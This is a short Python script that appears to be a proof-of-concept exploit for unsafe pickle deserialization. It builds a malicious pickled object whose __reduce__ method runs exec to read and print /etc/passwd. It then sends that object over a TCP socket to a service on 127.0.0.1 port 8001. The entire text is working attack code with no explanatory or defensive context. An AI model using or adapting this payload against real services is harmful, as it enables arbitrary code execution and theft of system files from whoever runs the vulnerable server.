import socket,pickle,builtins
HOST = "127.0.0.1"
PORT = 8001
class Pickle(object):
    def __reduce__(self):
        return (builtins.exec, ("with open('/etc/passwd','r') as files: print(files.readlines())",))
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.connect((HOST,PORT))
    sock.sendall(pickle.dumps(Pickle()))
